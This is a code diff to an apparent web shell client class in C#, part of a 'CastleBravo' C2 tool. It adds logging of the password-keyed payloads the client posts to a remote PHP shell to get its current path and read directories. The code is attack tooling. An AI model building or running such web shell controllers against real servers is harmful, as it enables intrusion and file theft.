@@ -14,6 +14,7 @@ namespace C2.Business.CastleBravo.WebShellTool
     {
         private string url;
         private string pwd;
+        public List<string> PayloadLog;
         //private string directorySeparator = "/";
 
         [NonSerialized]
@@ -45,7 +46,7 @@ namespace C2.Business.CastleBravo.WebShellTool
             this.url = address;
             this.pwd = pVariable;
             this.client = new WebClient();
-            System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls | System.Net.SecurityProtocolType.Tls11 | System.Net.SecurityProtocolType.Tls12;
+            PayloadLog = new List<string>();
             client.Encoding = Encoding.UTF8;
         }
 
@@ -80,11 +81,13 @@ namespace C2.Business.CastleBravo.WebShellTool
 
         private string PHPIndex()
         {
+            PayloadLog.Add("========获取当前路径========");
             return PHPPost(pwd + "=" + PHP_MAKE + "&" + ACTION + "=" + PHP_INDEX).Split('\t')[0];
         }
 
         private string PHPReadDict(string path)
         {
+            PayloadLog.Add("========获取" + path + "文件========");
             return PHPPost(pwd + "=" + PHP_MAKE + "&" + ACTION + "=" + PHP_READDICT + "&" + PARAM1 + "=" + HttpUtility.UrlEncode(Convert.ToBase64String(Encoding.UTF8.GetBytes(path))));
         }
 
@@ -95,6 +98,11 @@ namespace C2.Business.CastleBravo.WebShellTool
             byte[] postData = Encoding.UTF8.GetBytes(payload);
             byte[] responseData = client.UploadData(url, "POST", postData);//得到返回字符流  
             string result = Encoding.UTF8.GetString(responseData);//解码 
+
+            foreach(string kv in payload.Split('&'))
+            {
+                PayloadLog.Add(kv);
+            }
 
             return MidStrEx(result, SPL, SPR);
         }
